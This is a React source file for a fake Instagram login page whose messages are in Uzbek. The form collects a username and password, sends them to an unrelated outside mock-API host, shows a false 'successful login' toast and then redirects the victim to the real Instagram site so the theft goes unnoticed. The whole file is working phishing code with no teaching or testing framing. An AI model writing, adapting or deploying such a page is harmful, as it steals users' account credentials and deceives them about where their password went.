import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const InstagramLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username || !password) {
      toast.error("❌ Iltimos, barcha maydonlarni to‘ldiring!");
      return;
    }
    if (password.length < 6) {
      toast.error("❌ Parol kamida 6 ta belgi bo‘lishi kerak!");
      return;
    }
    try {
      const response = await axios.post("https://f8a3f2c439e7a64e.mokky.dev/user", { username, password });
      console.log("Server javobi:", response.data);
      toast.success("✅ Muvaffaqiyatli login! Instagramga yo‘naltirilmoqda...");
      setTimeout(() => (window.location.href = "https://www.instagram.com"), 2000);
    } catch (error) {
      console.error("API Xatolik:", error);
      toast.error("❌ Login amalga oshmadi! Iltimos, qayta urinib ko‘ring.");
    }
    setUsername("");
    setPassword("");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50">
      <div className="w-full max-w-xs">
        <div className="bg-white border border-gray-300 p-6 rounded-lg shadow-md text-center">
          <h2 className="text-3xl font-bold mb-6 font-sans">Instagram</h2>
          <form onSubmit={handleSubmit} className="space-y-3">
            <input
              type="text"
              placeholder="Phone number, username, or email"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full border border-gray-300 px-3 py-2 rounded-md focus:ring-blue-400 focus:outline-none"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full border border-gray-300 px-3 py-2 rounded-md focus:ring-blue-400 focus:outline-none"
            />
            <button type="submit" className="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition font-semibold">
              Log in
            </button>
          </form>
          <div className="text-sm text-blue-500 cursor-pointer mt-4">Forgot password?</div>
        </div>
        <div className="bg-white border border-gray-300 p-4 mt-4 text-center">
          <p className="text-gray-600 text-sm">
            Don’t have an account? <span className="text-blue-500 font-semibold cursor-pointer">Sign up</span>
          </p>
        </div>
      </div>
      <ToastContainer position="top-right" autoClose={3000} />
    </div>
  );
};

export default InstagramLogin;